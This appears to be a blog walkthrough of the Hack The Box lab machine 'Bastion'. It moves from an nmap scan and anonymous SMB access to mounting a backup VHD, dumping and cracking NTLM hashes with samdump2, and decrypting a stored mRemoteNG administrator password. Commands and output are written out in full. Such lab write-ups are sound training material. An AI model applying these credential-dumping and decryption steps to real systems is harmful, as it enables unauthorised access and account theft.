---
layout: post
title: Hack The Box Bastion
---

Bastion is a windows hack the box machine. I found it really fun to do as it was a box that I felt I could easily solve as I had learnt a lot from other machines.

Starting out with a standard nmap scan I like to use the flags recommended by IppSec, seem to work for me fine but would like to experiment with others to better understand the tool.
```
nmap -sV -sC -oA nmap 10.10.10.134

Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-10 06:49 EDT
Stats: 0:02:17 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.00% done; ETC: 06:51 (0:00:00 remaining)
Stats: 0:02:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.27% done; ETC: 06:51 (0:00:00 remaining)
Nmap scan report for 10.10.10.134
Host is up (0.24s latency).
Not shown: 747 closed ports, 249 filtered ports
PORT    STATE SERVICE    VERSION
22/tcp  open  tcpwrapped
135/tcp open  tcpwrapped
139/tcp open  tcpwrapped
445/tcp open  tcpwrapped Windows Server 2016 Standard 14393 tcpwrapped

Host script results:
|_clock-skew: mean: -39m32s, deviation: 1h09m10s, median: 23s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-07-10T12:51:54+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-07-10 06:51:52
|_  start_date: 2019-07-10 04:25:05

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 152.84 seconds
```
This was my first windows machine so I tried connecting with smbclient.

https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
```
smbclient -L 10.10.10.134

Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```
So we’re given a list of shares. I tried to connect to admin but that requires a password so instead I decide to try backups.
```
smbclient //10.10.10.134/Backups

Enter WORKGROUP\root's password: 

Entered empty password

Try "help" to get a list of possible commands.
ls
  .                                   D        0  Tue Apr 16 06:02:11 2019
  ..                                  D        0  Tue Apr 16 06:02:11 2019
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  WindowsImageBackup                  D        0  Fri Feb 22 07:44:02 2019

		7735807 blocks of size 4096. 2792330 blocks available
```
We have a txt file, a tmp file and another backup folder.
```
get note.txt

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```
Nothing too interesting in this.
```
get SDT65CB.tmp
```
I’ll keep a copy of the tmp file, may be useful later. 
Now I look into that backup folder.
```
cd WindowsImageBackup
ls
.                                   D        0  Fri Feb 22 07:44:02 2019
..                                  D        0  Fri Feb 22 07:44:02 2019
L4mpje-PC                           D        0  Fri Feb 22 07:45:32 2019

cd L4mpje-PC
ls
  .                                   D        0  Fri Feb 22 07:45:32 2019
  ..                                  D        0  Fri Feb 22 07:45:32 2019
  Backup 2019-02-22 124351            D        0  Fri Feb 22 07:45:32 2019
  Catalog                             D        0  Fri Feb 22 07:45:32 2019
  MediaId                             A       16  Fri Feb 22 07:44:02 2019
  SPPMetadataCache                    D        0  Fri Feb 22 07:45:32 2019

		7735807 blocks of size 4096. 2792330 blocks available

cd “Backup 2019-02-22 124351”

  .                                   D        0  Fri Feb 22 07:45:32 2019
  ..                                  D        0  Fri Feb 22 07:45:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd      A 37761024  Fri Feb 22 07:44:03 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd      A 5418299392  Fri Feb 22 07:45:32 2019
  BackupSpecs.xml                     A     1186  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml      A     1078  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml      A     8930  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml      A     6542  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml      A     2894  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml      A     1488  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml      A     1484  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml      A     3844  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml      A     3988  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml      A     7110  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml      A  2374620  Fri Feb 22 07:45:32 2019
```
Not really sure what’s there so I’ll see what else is on the machine.
```
cd ..
cd Catalog
ls
  .                                   D        0  Fri Feb 22 07:45:32 2019
  ..                                  D        0  Fri Feb 22 07:45:32 2019
  Backup 2019-02-22 124351            D        0  Fri Feb 22 07:45:32 2019
  Catalog                             D        0  Fri Feb 22 07:45:32 2019
  MediaId                             A       16  Fri Feb 22 07:44:02 2019
  SPPMetadataCache                    D        0  Fri Feb 22 07:45:32 2019

cd SPPMetadataCache

ls
  .                                   D        0  Fri Feb 22 07:45:32 2019
  ..                                  D        0  Fri Feb 22 07:45:32 2019
  {cd113385-65ff-4ea2-8ced-5630f6feca8f}      A    57848  Fri Feb 22 07:45:32 2019

cd "Backup 2019-02-22 124351"

ls
  .                                   D        0  Fri Feb 22 07:45:32 2019
  ..                                  D        0  Fri Feb 22 07:45:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd      A 37761024  Fri Feb 22 07:44:03 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd      A 5418299392  Fri Feb 22 07:45:32 2019
  BackupSpecs.xml                     A     1186  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml      A     1078  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml      A     8930  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml      A     6542  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml      A     2894  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml      A     1488  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml      A     1484  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml      A     3844  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml      A     3988  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml      A     7110  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml      A  2374620  Fri Feb 22 07:45:32 2019
```


https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25

Ok so now we know we’re dealing with vhd files we can mount them and virtually to explore it.
```
apt-get install libguestfs-tools

apt-get install cifs-utils

mkdir /mnt/remote

mount -t cifs //10.10.10.134/Backups /mnt/remote -o rw

cd /mnt/remote

guestmount --add "/mnt/remote/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" --inspector --ro /mnt/vhd -v

/mnt/vhd/Windows/System32/config
```
In there we can get the sam and system file
```
samdump2 SYSTEM SAM -o out

*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```
We use the second part of L4mpje to crack the password.

hashkiller.co.uk
26112010952d963c8dc4217daec986d9 NTLM bureaulampje 
```
ssh L4mpje@10.10.10.134
bureaulampje

cd Desktop
more user.txt
```
Now we can go look for the root. Since it has nRemoteNG on it we can exploit that using the confCons.xml file.
```
%appdata%

cd Roaming

cd nRemoteNG

more confCons.xml
```
Take password from confCons Password=”aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==”

https://github.com/haseebT/mRemoteNG-Decrypt
```
python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2

ssh administrator@10.10.10.134

cd desktop

more root.txt
```

